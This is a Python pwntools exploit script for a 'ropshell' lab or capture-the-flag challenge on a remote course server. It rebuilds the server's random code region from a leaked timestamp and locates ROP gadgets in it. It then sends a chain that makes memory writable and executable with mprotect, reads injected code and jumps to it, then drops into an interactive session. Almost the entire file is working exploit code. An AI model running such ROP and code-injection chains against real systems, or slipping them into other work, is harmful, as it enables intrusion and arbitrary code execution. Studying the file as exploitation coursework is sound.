#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
# import asm
from pwn import asm
from pwnlib.util.packing import flat
import sys

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

remote = False
code_bytes = b''
start_code_address = None
timestamp = None

# address
pop_rax_ret = None
pop_rdi_ret = None
syscall_ret = None
pop_rsi_ret = None
pop_rdx_ret = None

def get_init_info():
    global start_code_address, timestamp

    if remote:
        r.recvline()
        r.recvline()

    timestamp = int(r.recvline().decode().split(" ")[3])
    start_code_address = int(r.recvline().decode().split(" ")[5], base=16)

    print("timestamp: ", timestamp)
    print("start_code_address in hex: ", hex(start_code_address))
    return


def gen_random_code_bytes():
    """ c code here use to generate the code section content
    srand(t);
    for(i = 0; i < LEN_CODE/4; i++) {
        codeint[i] = (rand()<<16) | (rand() & 0xffff);
    }
    codeint[rand() % (LEN_CODE/4 - 1)] = 0xc3050f;   // 把 syscall ret 埋進去的
    if(mprotect(code, LEN_CODE, PROT_READ|PROT_EXEC) < 0) errquit("mprotect");
    """
    global timestamp, code_bytes

    import ctypes
    libc = ctypes.CDLL('libc.so.6')
    libc.srand(timestamp)
    LEN_CODE = (10*0x10000)

    codeint = []
    for i in range(0, int(LEN_CODE/4), 1):
        tmp = (libc.rand()<<16) | (libc.rand() & 0xffff)
        tmp &= 0xffffffff  # limit to the lower 32 bits
        codeint.append(tmp)
    codeint[libc.rand() % (int(LEN_CODE/4) - 1)] = 0xc3050f

    code_bytes = b''
    for single_int in codeint:
        byte_array = single_int.to_bytes(4, byteorder='little')
        code_bytes += byte_array

    return

def code_bytes_find(target_asm):
    global code_bytes

    pos = code_bytes.find(target_asm)
    if pos == -1:
        print("not found alert: ", target_asm)
    else:
        # print("pos: ", hex(pos))
        pass
    return pos

def get_rop_addr():
    global pop_rax_ret, pop_rdi_ret, syscall_ret, pop_rsi_ret, pop_rdx_ret

    pop_rax_ret = code_bytes_find(asm("pop rax\nret")) + start_code_address
    pop_rdi_ret = code_bytes_find(asm("pop rdi\nret")) + start_code_address
    syscall_ret = code_bytes_find(asm("syscall\nret")) + start_code_address
    pop_rsi_ret = code_bytes_find(asm("pop rsi\nret")) + start_code_address
    pop_rdx_ret = code_bytes_find(asm("pop rdx\nret")) + start_code_address


def task1_byte():
    global start_code_address, pop_rax_ret, pop_rdi_ret, syscall_ret

    send_line = flat(
        pop_rax_ret,
        60,
        pop_rdi_ret,
        37,
        syscall_ret,
        endianness = 'little'
    )

    return send_line

def mprotect_byte():
    global start_code_address, pop_rax_ret, pop_rdi_ret, syscall_ret, pop_rsi_ret, pop_rdx_ret
    mprotect_address = start_code_address & ~(0xfff)  # use the align address
    print("start_code_address: ", hex(start_code_address))
    print("mprotect_address: ", hex(mprotect_address))

    # 1. open memory = codeint to be able to read & write & execute
    # 2. read user input
    # ropshell will clean the register before executing

    send_line = flat(
        # al is rax's LSB 8 bits, 0xa is 10, mprotect syscall number
        # rax to place syscall number
        pop_rax_ret,
        10,
        # rdi - page start
        pop_rdi_ret,
        mprotect_address,
        # rsi - page len
        pop_rsi_ret,
        40960,
        # rdx - dl is LSB 8 bits, open mode -> read(0x1), write(0x2), exec(0x4) -(all or)-> 0x7
        pop_rdx_ret,
        7,
        syscall_ret,

        # write syscall
        pop_rax_ret,
        1,
        # fd (stdout)
        pop_rdi_ret,
        1,
        # buf addr
        pop_rsi_ret,
        start_code_address,
        # len
        pop_rdx_ret,
        50,
        syscall_ret,

        # read user input
        # read syscall
        pop_rax_ret,
        0,
        # fd (stdin)
        pop_rdi_ret,
        0,
        # buf addr
        pop_rsi_ret,
        start_code_address,
        # len
        pop_rdx_ret,
        4096,
        syscall_ret,
        # write syscall
        pop_rax_ret,
        1,
        # fd (stdout)
        pop_rdi_ret,
        1,
        # buf addr
        pop_rsi_ret,
        start_code_address,
        # len
        pop_rdx_ret,
        50,
        syscall_ret,
        # go to execute the code here
        start_code_address,
    )

    return send_line


if __name__ == '__main__':
    r = None
    if 'qemu' in sys.argv[1:]:
        r = process("qemu-x86_64-static ./ropshell", shell=True)
    elif 'bin' in sys.argv[1:]:
        # r = process("./ropshell", shell=False)
        r = process("./server", shell=False)  # my server
    elif 'local' in sys.argv[1:]:
        r = remote("localhost", 10494)
    else:
        r = remote("up23.zoolab.org", 10494)
        remote = True

    if type(r) != pwnlib.tubes.process.process:
        pw.solve_pow(r)

    # gdb.attach(r)

    # find target asm
    get_init_info()
    if start_code_address == None or timestamp == None:
        exit(0)

    gen_random_code_bytes()
    get_rop_addr()

    send_line = task1_byte()
    # [first send]
    send_line = mprotect_byte()
    # send_line += task1_byte()
    # print("send_line_1: ", send_line)
    
    r.send(send_line)

    # send shell code -> normal exit
    # [second send] 
    print("bytes command received output: ", r.recvuntil("bytes command received.\n", drop=False).decode())

    # 1st write codeint output
    print(r.recv())

    send_line_2 = task1_byte()
    print("send_line_2 to read: ", send_line_2)
    r.send(send_line_2)

    # 2nd write codeint output
    print(r.recv())

    print("after send 2")

    # print(r.recvline().decode())
    # print(r.recvline().decode())    
    # print(r.recvline().decode())    

    # 2nd write codeint output
    r.interactive()